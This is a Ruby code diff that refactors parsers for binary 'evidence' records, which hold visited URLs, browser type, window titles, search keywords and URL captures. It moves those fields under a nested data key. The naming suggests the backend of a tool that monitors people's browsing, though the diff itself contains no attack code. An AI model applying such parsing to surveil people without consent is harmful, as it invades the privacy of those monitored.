@@ -51,19 +51,19 @@ module UrlEvidence
     until stream.eof?
       tm = stream.read 36
       @info[:acquired] = Time.gm(*tm.unpack('l*'), 0)
-      @info[:url] = ''
-      @info[:window] = ''
+      @info[:data][:url] = ''
+      @info[:data][:title] = ''
 
       delim = stream.read(4).unpack("L").first
       raise EvidenceDeserializeError.new("Malformed evidence (invalid URL version)") unless delim == VERSION_DELIMITER
 
       url = stream.read_utf16le_string
-      @info[:url] = url.utf16le_to_utf8 unless url.nil?
+      @info[:data][:url] = url.utf16le_to_utf8 unless url.nil?
       browser = stream.read(4).unpack("L").first
-      @info[:browser] = BROWSER_TYPE[browser]
+      @info[:data][:browser] = BROWSER_TYPE[browser]
       window = stream.read_utf16le_string
-      @info[:window] = window.utf16le_to_utf8 unless window.nil?
-      @info[:keywords] = decode_query @info[:url]
+      @info[:data][:title] = window.utf16le_to_utf8 unless window.nil?
+      @info[:data][:keywords] = decode_query @info[:data][:url]
 
       delim = stream.read(4).unpack("L").first
       raise EvidenceDeserializeError.new("Malformed URL (missing delimiter)") unless delim == ELEM_DELIMITER
@@ -112,15 +112,14 @@ module UrlcaptureEvidence
     version, browser, url_len, window_len = binary.read(16).unpack("I*")
     raise EvidenceDeserializeError.new("invalid log version for URLCAPTURE") unless version == URL_VERSION
 
-    @info[:browser] = BROWSER_TYPE[browser]
-    @info[:url] = binary.read(url_len).utf16le_to_utf8
-    @info[:window] = binary.read(window_len).utf16le_to_utf8
-    @info[:keywords] = decode_query @info[:url]
+    @info[:data][:browser] = BROWSER_TYPE[browser]
+    @info[:data][:url] = binary.read(url_len).utf16le_to_utf8
+    @info[:data][:title] = binary.read(window_len).utf16le_to_utf8
+    @info[:data][:keywords] = decode_query @info[:data][:url]
   end
 
   def decode_content
-    @info[:content] = @info[:chunks].first
-    @info[:size] = @info[:content].bytesize
+    @info[:data][:grid_content] = @info[:chunks].first
     return [self]
   end
 end
